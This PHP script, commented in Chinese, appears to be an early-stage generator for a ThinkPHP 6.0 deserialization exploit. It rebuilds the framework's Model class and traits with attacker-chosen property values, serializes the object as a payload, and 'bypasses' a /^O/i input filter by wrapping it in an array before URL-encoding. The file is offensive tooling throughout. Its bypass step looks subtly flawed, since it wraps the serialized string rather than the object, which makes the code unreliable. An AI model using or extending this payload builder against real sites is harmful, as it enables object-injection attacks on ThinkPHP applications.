<?php
// ThinkPHP 6.0 反序列化利用链生成器
// 绕过正则 /^O/i 的方法：使用数组包装

namespace think\model\concern {
    trait Attribute {
        private $data = [];
        private $withAttr = [];
        protected $json = [];
        protected $jsonAssoc = false;
        protected $schema = [];
        protected $field = [];
        protected $type = [];
        protected $disuse = [];
        protected $readonly = [];
        protected $strict = true;
        private $origin = [];
        private $set = [];
    }

    trait Conversion {
        protected $visible = [];
        protected $hidden = [];
        protected $append = [];
        protected $resultSetType;
    }

    trait RelationShip {
        private $relation = [];
    }

    trait ModelEvent {
        protected $event = [];
    }

    trait TimeStamp {
        protected $autoWriteTimestamp = false;
        protected $createTime = 'create_time';
        protected $updateTime = 'update_time';
        protected $defaultTimeFormat = 'Y-m-d H:i:s';
    }
}

namespace think {
    class Model {
        use \think\model\concern\Attribute;
        use \think\model\concern\RelationShip;
        use \think\model\concern\ModelEvent;
        use \think\model\concern\TimeStamp;
        use \think\model\concern\Conversion;

        private $exists = false;
        private $force = false;
        private $replace = false;
        protected $suffix;
        private $updateWhere;
        protected $connection;
        protected $name;
        protected $table;
        protected static $initialized = [];
        protected $defaultSoftDelete;
        protected $globalScope = [];
        private $lazySave = false;
        protected static $db;
        protected static $invoker;
        protected static $maker = [];

        public function __construct() {
            $this->lazySave = true;
            $this->exists = true;
            $this->data = ['test' => 'test'];
        }
    }
}

namespace {
    // 创建一个简单的测试对象
    $obj = new \think\Model();

    // 生成序列化字符串
    $payload = serialize($obj);
    echo "原始 Payload:\n";
    echo $payload . "\n\n";

    // 检查是否包含 O:
    if (preg_match('/^O/i', $payload)) {
        echo "Payload 以 O 开头，需要绕过\n";
    }

    // 使用数组包装绕过
    $wrapped = serialize([$payload]);
    echo "包装后的 Payload:\n";
    echo $wrapped . "\n\n";

    // URL 编码
    echo "URL 编码:\n";
    echo urlencode($payload) . "\n";
}
